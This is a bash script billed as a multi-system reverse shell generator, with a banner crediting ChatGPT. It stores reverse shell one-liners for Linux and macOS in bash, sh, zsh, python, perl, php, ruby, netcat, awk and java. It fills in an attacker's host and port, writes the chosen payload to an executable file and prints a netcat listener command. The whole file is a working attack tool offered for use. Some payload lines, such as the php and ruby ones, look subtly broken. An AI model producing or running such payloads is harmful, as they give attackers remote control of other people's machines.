#!/bin/bash

trap ctrl_c INT

function ctrl_c() {
    echo -e "\n\e[1;31m[!] Exiting by user interrupt.\e[0m"
    exit 1
}

clear

function color_echo() {
    echo -e "\e[1;32m$1\e[0m"
}

function error_echo() {
    echo -e "\e[1;31m$1\e[0m"
}

function banner() {
    echo -e "\e[1;34m"
    echo "╔═══════════════════════════════════════════════════╗"
    echo "║ 🐚 Multi-System Reverse Shell Generator v1.0      ║"
    echo "║ ⚡ No external tools - Pure Native Payloads       ║"
    echo "║ 🔥 Just this script & nc — that's all you need    ║"
    echo "║ 🧠 Created by ChatGPT                             ║"
    echo "╚═══════════════════════════════════════════════════╝"
    echo -e "\e[0m"
}

function ask_with_validation() {
    local prompt="$1"
    local varname="$2"
    local input=""
    while true; do
        read -p "$(echo -e '\e[1;36m'"$prompt"'\e[0m')" input
        if [[ -z "$input" ]]; then
            error_echo "[!] Input cannot be empty."
        else
            eval $varname="'$input'"
            break
        fi
    done
}

function ask_choice() {
    local prompt="$1"
    local choices=(${!2})
    local varname="$3"
    local input=""
    while true; do
        read -p "$(echo -e '\e[1;36m'"$prompt"'\e[0m')" input
        if [[ "$input" =~ ^[1-9][0-9]*$ ]] && [ "$input" -ge 1 ] && [ "$input" -le ${#choices[@]} ]; then
            eval $varname="${choices[$((input-1))]}"
            break
        else
            error_echo "[!] Invalid choice. Try again."
        fi
    done
}

banner

OS_OPTIONS=("linux" "macos")
echo -e "\e[1;33m[1] Linux\n[2] macOS\e[0m"
ask_choice "➡️  Choose target OS: " OS_OPTIONS[@] OS

declare -A PAYLOADS_LINUX=(
    ["bash"]="bash -i >& /dev/tcp/LHOST/LPORT 0>&1"
    ["sh"]="sh -i >& /dev/tcp/LHOST/LPORT 0>&1"
    ["zsh"]="zsh -i >& /dev/tcp/LHOST/LPORT 0>&1"
    ["python2"]="python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"LHOST\",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
    ["python3"]="python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"LHOST\",LPORT));[os.dup2(s.fileno(),fd) for fd in(0,1,2)];pty.spawn(\"/bin/bash\")'"
    ["perl"]="perl -e 'use Socket;\$i=\"LHOST\";\$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
    ["php"]="php -r '\$sock=fsockopen(\"LHOST\",LPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    ["ruby"]="ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"LHOST\",LPORT);exec \"/bin/sh -i <&3 >&3 2>&3\"'"
    ["nc"]="rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f"
    ["awk"]="awk 'BEGIN{s=\"/inet/tcp/0/LHOST/LPORT\";while(42){do{printf \"shell> \" |&s; s |& getline c; if(c){while((c |& getline) > 0) print \$0 |& s;}}}' /dev/null"
    ["java"]="r = Runtime.getRuntime();p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/LHOST/LPORT;cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]);p.waitFor();"
)

declare -A PAYLOADS_MACOS=(
    ["bash"]="bash -i >& /dev/tcp/LHOST/LPORT 0>&1"
    ["zsh"]="zsh -i >& /dev/tcp/LHOST/LPORT 0>&1"
    ["python3"]="python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"LHOST\",LPORT));[os.dup2(s.fileno(),fd) for fd in(0,1,2)];pty.spawn(\"/bin/bash\")'"
)

case "$OS" in
    linux)
        FORMATS=("bash" "sh" "zsh" "python2" "python3" "perl" "php" "ruby" "nc" "awk" "java")
        ;;
    macos)
        FORMATS=("bash" "zsh" "python3")
        ;;
    *)
        error_echo "[!] Unsupported OS"
        exit 1
        ;;
esac

echo ""
for i in "${!FORMATS[@]}"; do
    echo -e "\e[1;33m[$((i+1))] ${FORMATS[$i]}\e[0m"
done

ask_choice "➡️  Choose payload method: " FORMATS[@] PAYLOAD_TYPE
ask_with_validation "🌐 Enter LHOST: " LHOST
ask_with_validation "🎯 Enter LPORT: " LPORT

case "$OS" in
    linux)
        TEMPLATE=${PAYLOADS_LINUX[$PAYLOAD_TYPE]}
        EXT=".sh"
        ;;
    macos)
        TEMPLATE=${PAYLOADS_MACOS[$PAYLOAD_TYPE]}
        EXT=".sh"
        ;;
esac

FINAL_PAYLOAD="${TEMPLATE//LHOST/$LHOST}"
FINAL_PAYLOAD="${FINAL_PAYLOAD//LPORT/$LPORT}"

OUTFILE="payload_${PAYLOAD_TYPE}${EXT}"
echo "$FINAL_PAYLOAD" > "$OUTFILE"
chmod +x "$OUTFILE"

color_echo "✅ Payload created: $OUTFILE"
echo ""
color_echo "💡 Start listener with:"
echo -e "\e[1;35mnc -lvnp $LPORT\e[0m"



